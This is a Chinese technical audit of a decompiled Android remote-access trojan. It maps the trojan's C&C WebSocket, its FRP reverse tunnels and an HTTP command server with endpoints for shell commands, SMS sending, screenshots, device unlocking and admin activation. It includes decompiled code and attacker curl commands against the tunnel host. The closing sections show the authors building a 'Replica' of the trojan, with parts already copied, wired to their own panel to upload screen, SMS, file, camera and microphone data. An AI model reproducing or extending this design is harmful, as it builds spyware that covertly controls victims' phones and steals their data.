# Vendor APK 网络架构深度审计

> 基于 vendor 源码审计 + docs/rathat/ 分析文档
> 日期: 2026-03-18

---

## 问题 1: Vendor APK 何时调用 WebSocket connect()？

### 1.1 Vendor 的 WebSocket 不是 OkHttp WebSocket

Vendor APK 有**两套完全不同的 WebSocket**：

| 组件 | 类型 | 文件 | 用途 |
|------|------|------|------|
| `bridge/a.java` | **WebSocket 客户端** (出站) | 继承 `f1.a` (Java-WebSocket 库) | 连接远程 C&C 服务器，接收任务推送 |
| `server/c.java` | **WebSocket 服务器** (入站) | 继承 `n1.b` (Java-WebSocket 库) | 本地监听 7900/7980 端口，供 frpc/rat-hat 通信 |

### 1.2 Bridge WebSocket 客户端 — 连接时机

**文件**: `com/guard/wallet/bridge/a.java`

```java
// WebSocket URL 构建 (静态字段，类加载时即确定)
public static final String f135y = "wss://".concat(d.h()).concat("/bridge");
// 结果: wss://api.rathat.club/bridge

public a(String bridgePath, BridgeMessage message) {
    super(URI.create(f135y));  // 传给 Java-WebSocket 基类
    this.f136u = bridgePath;   // 如 "/cacheTask"
    this.f137v = message;      // 初始消息
}
```

**连接触发链路**:

```
KeepHeartThread.run() (每 10s)
  → 检查 bridge WebSocket 连接状态
  → 如果未连接 → 创建 new bridge.a("/cacheTask", initMessage)
  → 调用 a.connect()  (继承自 f1.a 的 connect 方法)
  → 连接 wss://api.rathat.club/bridge
```

Vendor 的 bridge WebSocket **不是在 MainApplication.init() 中直接启动的**，而是由 `KeepHeartThread`（心跳线程，10s 间隔）在运行时检测到未连接时**懒启动**。这是一种弹性设计——即使首次连接失败，心跳线程会持续重试。

### 1.3 本地 WebSocket 服务器 — 启动时机

**文件**: `com/guard/wallet/server/c.java`

```java
// MainApplication.init() 行 373:
com.guard.wallet.server.c.H();  // 静态方法，同步启动

public static void H() {
    c G = G();           // 获取/创建单例 (端口 7900, 备选 7980)
    G.f317g = true;      // setDaemon
    Thread thread = new Thread(G2);
    thread.setDaemon(true);
    thread.start();
    Log.d("MyWebSocketServer", "webSocketServer start");
}
```

本地 WebSocket 服务器在 `MainApplication.init()` 阶段 2（同步初始化）中**立即启动**，监听 `0.0.0.0:7900`（备选 7980）。

### 1.4 总结: 两个 WebSocket 的启动时序

```
T+200ms  MainApplication.init()
           ├─ server.b.W2()     → 启动本地 HTTP 服务器 (7910/7911/7912)
           └─ server.c.H()      → 启动本地 WebSocket 服务器 (7900/7980)

T+500ms  unlockedInstance()
           └─ KeepHeartThread 启动 (Timer 10s, 10s)

T+10.5s  KeepHeartThread 首次 tick
           ├─ 检查 bridge WebSocket 连接状态
           ├─ 未连接 → new bridge.a("/cacheTask", initMsg)
           └─ a.connect() → wss://api.rathat.club/bridge
```

---

## 问题 2: Vendor APK 如何接收命令与分发？

### 2.1 三层命令接收架构

Vendor 有**三条独立的命令接收通道**，形成冗余：

```
┌─────────────────────────────────────────────────────────────┐
│                    命令接收通道                                │
│                                                              │
│  通道 1: Bridge WebSocket (wss://api.rathat.club/bridge)     │
│    → 接收 C&C 服务器推送的 CacheTask 命令                      │
│    → 实时性高，延迟 <1s                                       │
│                                                              │
│  通道 2: 本地 HTTP 服务器 (127.0.0.1:7910/7911/7912)         │
│    → 接收 frpc 隧道转发的 HTTP 命令                            │
│    → 通过 FRP 内网穿透，攻击者直接 HTTP 调用                    │
│                                                              │
│  通道 3: 本地 WebSocket 服务器 (0.0.0.0:7900/7980)           │
│    → 接收本地进程 (rat-hat/frpc) 的 WebSocket 消息             │
│    → 用于进程间通信                                            │
└─────────────────────────────────────────────────────────────┘
```

### 2.2 通道 1: Bridge WebSocket — C&C 命令推送

**文件**: `bridge/a.java` → `x(String str)` (onMessage 回调)

```java
public final void x(String str) {
    JsonObject M = h.M(str);
    int type = M.get("type").getAsInt();

    if (type == 15) {  // BridgeBufferMessage — 任务推送
        BridgeBufferBody body = 解析(M.getAsJsonObject("body"));

        if ("/cacheTask".equals(body.getBridgePath())) {
            CacheTaskVO task = 解析(body.getBuffer());
            q.N(task);  // ← 核心分发入口
        }
    }

    if (type == 16) {  // 响应确认
        if (body.success) {
            failCount.set(0);       // 重置失败计数
        } else {
            if (failCount.incrementAndGet() >= 6) {
                t();                // 断开连接，等待重连
            }
        }
    }
}
```

**消息格式**:
```json
{
  "type": 15,
  "body": {
    "bridgePath": "/cacheTask",
    "deviceId": "790694236383350784",
    "toDesktop": true,
    "buffer": "{\"taskType\":\"screenshot\",\"params\":{...}}"
  }
}
```

**分发逻辑** (`q.N(CacheTaskVO)`)：
- 解析 `taskType` 字段
- 根据任务类型分发到对应处理器
- 执行结果通过 HTTP POST 上传到 C&C 服务器

### 2.3 通道 2: 本地 HTTP 服务器 — FRP 隧道命令

**文件**: `server/b.java` (11172 行，核心命令处理器)

这是 vendor 最庞大的类，实现了一个完整的 HTTP 命令服务器。它监听 3 个端口：

| 端口 | 用途 | 访问者 |
|------|------|--------|
| 7910 | 主命令端口 | frpc 隧道转发 (外部攻击者) |
| 7911 | rathat 代理端口 | librat-hat.so (本地 Go 进程) |
| 7912 | 无障碍代理端口 | 无障碍服务内部调用 |

**命令路由表** (从 server/b.java 提取的 HTTP 端点):

```
设备信息类:
  GET  /deviceId                    → 返回设备 ID
  GET  /deviceInfo                  → 返回完整设备信息 (DeviceInfoVO)
  GET  /batteryLevel                → 返回电池电量
  GET  /netState                    → 返回网络状态
  GET  /checkPort                   → 检查端口占用

无障碍操作类:
  POST /searchNode                  → 搜索 UI 节点
  POST /searchNodeList              → 搜索 UI 节点列表
  POST /searchNodeByFilter          → 按过滤器搜索节点
  POST /searchNodeByFilterWithChild → 带子节点过滤搜索
  POST /searchNodeByFilterWithUp    → 带父节点过滤搜索
  POST /searchNodeByFiltersWithOr   → OR 条件搜索
  POST /clickNode                   → 点击节点
  POST /longClickNode               → 长按节点
  POST /scrollForward               → 向前滚动
  POST /scrollBackward              → 向后滚动
  POST /setText                     → 设置文本
  POST /globalAction                → 全局操作 (返回/Home/通知栏)
  POST /targetAction                → 目标操作

屏幕控制类:
  POST /takeScreenShot              → 截屏
  POST /touchEvent                  → 触摸事件 (点击/滑动)
  POST /screenMetrics               → 获取屏幕尺寸

ADB 控制类:
  POST /syncADBConfig               → 同步 ADB 配置
  POST /shareADBConfig              → 共享 ADB 配置
  POST /adbShell                    → 执行 ADB shell 命令
  POST /adbInstall                  → ADB 安装应用
  POST /adbPair                     → ADB 配对

远程控制类:
  POST /sendSMS                     → 发送短信
  POST /startApp                    → 启动应用
  POST /deleteFile                  → 删除文件
  POST /downloadFile                → 下载文件
  POST /monitorLocation             → 监控位置
  POST /unlockDevice                → 解锁设备
  POST /lockPattern                 → 锁屏图案

安全控制类:
  POST /activeAdmin                 → 激活设备管理员
  POST /resetAccessibilityService   → 重置无障碍服务
  POST /openDevelopment             → 打开开发者选项
  POST /closeDevelopment            → 关闭开发者选项
  POST /openADBDebug                → 打开 ADB 调试
  POST /openWifiDebug               → 打开 WiFi 调试
  POST /closeWifiDebug              → 关闭 WiFi 调试

通知/UI 类:
  POST /blockView                   → 显示遮罩 (锁屏/更新伪装)
  POST /notificationDialog          → 显示通知对话框
  POST /permissionRequest           → 权限请求
  POST /navigateWifiSettingDialog   → WiFi 设置导航

数据上报类:
  POST /containerEvent              → 容器事件上报
  POST /matchListenWindow           → 匹配监听窗口
  POST /listenHelper                → 监听助手
  POST /finishListenHelper          → 完成监听助手
  POST /noticeAlive                 → 通知存活
  POST /router                      → 路由转发
```

**命令处理示例** (截屏):

```java
// server/b.java 中的路由处理
if ("/takeScreenShot".equals(path)) {
    // 1. 通过无障碍服务截屏
    TakeScreenShotResult result = MyAccessibilityService.takeScreenShot();
    // 2. 构建 ApiResult 响应
    ApiResult apiResult = new ApiResult();
    apiResult.setData(result);
    apiResult.setCode(200);
    // 3. 返回 JSON 响应
    kVar.h(h.N(apiResult));
    kVar.l();
}
```

### 2.4 通道 3: 本地 WebSocket 服务器 — 进程间通信

**文件**: `server/c.java`

本地 WebSocket 服务器维护 4 个连接队列：

```java
public final ConcurrentLinkedQueue f206y;  // 队列 1: 通用连接
public final ConcurrentLinkedQueue f207z;  // 队列 2: 消息广播连接
public final ConcurrentLinkedQueue A;      // 队列 3: 控制连接
public final ConcurrentLinkedQueue B;      // 队列 4: 数据连接
```

`I(String str)` 方法向队列 2 的所有连接广播消息：

```java
public final void I(String str) {
    Iterator it = this.f207z.iterator();
    while (it.hasNext()) {
        ((e1.b) it.next()).a(str.getBytes(StandardCharsets.UTF_8));
    }
}
```

### 2.5 命令分发总流程

```
                    ┌──────────────────────┐
                    │   C&C 服务器          │
                    │ api.rathat.club:443  │
                    └──────┬───────────────┘
                           │
              ┌────────────┼────────────────┐
              ↓                             ↓
    ┌─────────────────┐          ┌─────────────────────┐
    │ Bridge WebSocket │          │   FRP 服务器          │
    │ wss://.../bridge │          │ frp.rathat.live:7000 │
    └────────┬────────┘          └──────────┬──────────┘
             │                              │
             ↓                              ↓
    ┌─────────────────┐          ┌─────────────────────┐
    │ bridge/a.java    │          │ libfrpc.so           │
    │ onMessage(type15)│          │ FRP 隧道客户端        │
    │ → q.N(cacheTask) │          │ → 转发到 127.0.0.1   │
    └────────┬────────┘          └──────────┬──────────┘
             │                              │
             ↓                              ↓
    ┌─────────────────┐          ┌─────────────────────┐
    │ 任务执行器        │          │ server/b.java        │
    │ 解析 taskType    │          │ HTTP 命令服务器       │
    │ 调用对应处理器    │          │ 路由到对应 handler    │
    └─────────────────┘          └─────────────────────┘
             │                              │
             └──────────┬───────────────────┘
                        ↓
              ┌─────────────────────┐
              │ 执行层               │
              │ - MyAccessibilityService (UI 操作)
              │ - MediaProjection (截屏/录屏)
              │ - ContentResolver (数据读取)
              │ - SmsManager (发短信)
              │ - DevicePolicyManager (设备管理)
              └─────────────────────┘
```

---

## 问题 3: Vendor 本地服务器 + FRP 内网穿透的作用与远程控制实现

### 3.1 架构总览: 三层网络栈

```
┌─────────────────────────────────────────────────────────────┐
│                    Android 设备 (内网)                        │
│                                                              │
│  ┌─────────────────┐  ┌─────────────────┐  ┌────────────┐  │
│  │ Java 应用层      │  │ librat-hat.so   │  │ libfrpc.so │  │
│  │                  │  │ (Go HTTP 服务器) │  │ (FRP 客户端)│  │
│  │ server/b.java   │  │ 127.0.0.1:8080  │  │ → frps:7000│  │
│  │ 127.0.0.1:7910  │  │                  │  │            │  │
│  │ 127.0.0.1:7911  │  │                  │  │            │  │
│  │ 127.0.0.1:7912  │  │                  │  │            │  │
│  │                  │  │                  │  │            │  │
│  │ server/c.java   │  │                  │  │            │  │
│  │ 0.0.0.0:7900    │  │                  │  │            │  │
│  └─────────────────┘  └─────────────────┘  └────────────┘  │
│         ↑                      ↑                   │        │
│         │ 本地 HTTP            │ 本地 HTTP          │ 出站   │
│         └──────────────────────┘                   │ TCP    │
│                                                    ↓        │
└────────────────────────────────────────────────────┼────────┘
                                                     │
                                              NAT/防火墙穿透
                                                     │
                                                     ↓
                                          ┌──────────────────┐
                                          │ FRP 服务器 (公网)  │
                                          │ frp.rathat.live  │
                                          │     :7000        │
                                          └──────────────────┘
                                                     ↑
                                                     │
                                          ┌──────────────────┐
                                          │ 攻击者/控制面板    │
                                          │ 通过 FRP 隧道     │
                                          │ 访问设备 HTTP API  │
                                          └──────────────────┘
```

### 3.2 各组件职责

#### librat-hat.so — Go 语言 HTTP 服务器

| 属性 | 值 |
|------|-----|
| 语言 | Go (静态编译) |
| 大小 | 16 MB (ARM64) |
| 监听 | 127.0.0.1:8080 (仅本地) |
| 功能 | 接收 FRP 转发的 HTTP 命令，通过 JNI 回调 Java 层执行 |

为什么用 Go 而不是 Java？
- Go 编译为原生二进制，性能更高
- 独立进程，不受 Android 进程管理限制
- 即使 Java 层被冻结 (华为 Pged-Freezer)，Go 进程仍可运行

#### libfrpc.so — FRP 内网穿透客户端

| 属性 | 值 |
|------|-----|
| 语言 | Go (基于 github.com/fatedier/frp) |
| 大小 | 14 MB (ARM64) |
| 连接 | frp.rathat.live:7000 (出站 TCP) |
| 功能 | 建立反向隧道，将外部请求转发到本地 HTTP 服务器 |

**为什么需要 FRP？**

手机在 NAT 后面（移动网络/WiFi 路由器），没有公网 IP，攻击者无法主动连接。FRP 解决方案：

```
1. 手机主动连接 FRP 服务器 (出站流量，NAT 允许)
2. FRP 服务器分配远程端口 (如 12345)
3. 攻击者访问 frp.rathat.live:12345
4. FRP 服务器通过隧道转发到手机
5. 手机 libfrpc.so 转发到 127.0.0.1:7910 (Java HTTP 服务器)
6. server/b.java 执行命令并返回结果
```

#### server/b.java — Java HTTP 命令服务器 (11172 行)

这是 vendor 最核心的远程控制组件。它是一个完整的 HTTP API 服务器，提供 50+ 个命令端点（见问题 2 的路由表）。

**启动方式**:
```java
// MainApplication.init() 行 365-372:
com.guard.wallet.server.b.b = new com.guard.wallet.server.b();
com.guard.wallet.server.b.b.W2();  // 启动 asyncHttpServer
// 日志: "HttpServer: asyncHttpServer 已启动"
```

#### server/c.java — 本地 WebSocket 服务器

监听 7900/7980 端口，用于：
- librat-hat.so 与 Java 层的实时双向通信
- 进程间事件通知（如截屏完成、命令执行结果）
- 连接状态广播

### 3.3 MODULE_06 远程控制的完整实现

Vendor 的远程控制通过**三条路径**实现，按优先级：

#### 路径 1: FRP 直连 (最低延迟，最稳定)

```
攻击者 → FRP 服务器:12345 → 隧道 → libfrpc.so → 127.0.0.1:7910 → server/b.java
                                                                        │
                                                                        ↓
                                                              执行命令 (截屏/发短信/...)
                                                                        │
                                                                        ↓
                                                              HTTP 响应原路返回
```

**优势**: 攻击者可以像调用本地 API 一样操作远程设备
**示例**:
```bash
# 攻击者执行截屏
curl http://frp.rathat.live:12345/takeScreenShot
# 返回: {"code":200,"data":{"base64":"...","width":1080,"height":1920}}

# 攻击者搜索 UI 节点
curl -X POST http://frp.rathat.live:12345/searchNode \
  -d '{"text":"密码","delegateId":"main"}'

# 攻击者发送短信
curl -X POST http://frp.rathat.live:12345/sendSMS \
  -d '{"phone":"13800138000","content":"验证码是123456"}'
```

#### 路径 2: WebSocket 推送 (实时，但需要 C&C 中转)

```
C&C 服务器 → wss://bridge → bridge/a.java → 解析 CacheTaskVO → 执行任务
                                                                    │
                                                                    ↓
                                                          HTTP POST 上传结果
                                                          → api.rathat.club/api/*
```

**优势**: 不依赖 FRP 隧道，只要 WebSocket 连接存活即可
**劣势**: 需要 C&C 服务器中转，延迟略高

#### 路径 3: HTTP 轮询 (降级方案)

```
KeepHeartThread (10s) → HTTP GET /api/containerApi/getCacheTask
                      → 如果有待执行任务 → 执行 → POST 结果
```

**优势**: 最简单，最可靠，即使 WebSocket 和 FRP 都断了也能工作
**劣势**: 延迟高 (最多 10s)，流量大

### 3.4 三条路径的冗余设计

```
优先级 1: FRP 直连     → 延迟 <100ms, 双向实时
优先级 2: WebSocket 推送 → 延迟 <1s, 服务端推送
优先级 3: HTTP 轮询     → 延迟 ≤10s, 客户端拉取

任何一条路径断开，其他路径自动接管。
KeepHeartThread 负责监控所有连接状态并自动重连。
```

### 3.5 与 Replica 的差距

| 组件 | Vendor | Replica 当前状态 |
|------|--------|-----------------|
| Bridge WebSocket 客户端 | ✅ `bridge/a.java` → `wss://server/bridge` | ❌ `WebSocketClient.java` 存在但 wsUrl=null，从未连接 |
| 本地 HTTP 服务器 | ✅ `server/b.java` 11172 行, 50+ 端点 | ✅ `HttpCommandServer.java` 22159 行 (已复刻) |
| 本地 WebSocket 服务器 | ✅ `server/c.java` 端口 7900/7980 | ✅ `LocalWebSocketServer.java` 4200 行 (已复刻) |
| FRP 客户端 | ✅ `libfrpc.so` 14MB Go 二进制 | ❌ 未实现 (需要 native 库) |
| RAT HTTP 服务器 | ✅ `librat-hat.so` 16MB Go 二进制 | ❌ 未实现 (需要 native 库) |
| KeepHeartThread | ✅ 10s 间隔，管理所有连接 | ✅ 已启动但缺少 WebSocket 连接管理 |
| 命令分发 | ✅ 三通道冗余 | ❌ 无命令接收能力 |

---

## 关键结论

### Vendor 的网络架构是三层冗余设计

1. **Java 层** (server/b.java + server/c.java): HTTP + WebSocket 本地服务器，提供命令执行能力
2. **Native 层** (librat-hat.so + libfrpc.so): Go 语言实现的 HTTP 服务器 + FRP 内网穿透，提供外部访问能力
3. **Bridge 层** (bridge/a.java): WebSocket 客户端连接 C&C 服务器，接收推送命令

### Replica 要连接 Laravel Swoole WebSocket 的定位

Replica 不需要复刻 vendor 的 `bridge/a.java`（那是连接 vendor 自己的 C&C 服务器）。

Replica 的 `WebSocketClient.java` 应该连接到**我们自己的 Laravel Swoole WebSocket 服务器** (`ws://host:8081`)，使用 Laravel 定义的协议 (`itype: "Slr_client"`, `subc: "ping/screen/sms/..."`)。

这意味着 Replica 的 WebSocket 客户端需要：
1. 使用 Laravel 协议格式（不是 vendor 的 bridge 格式）
2. 作为 `Slr_client` 角色注册
3. 发送心跳 (`subc: "ping"` + 设备状态)
4. 接收 Panel 下发的控制命令
5. 上报数据 (screen/sms/files/cam/mic 等)

这是一个**全新的协议适配**，不是简单的 vendor 复刻。
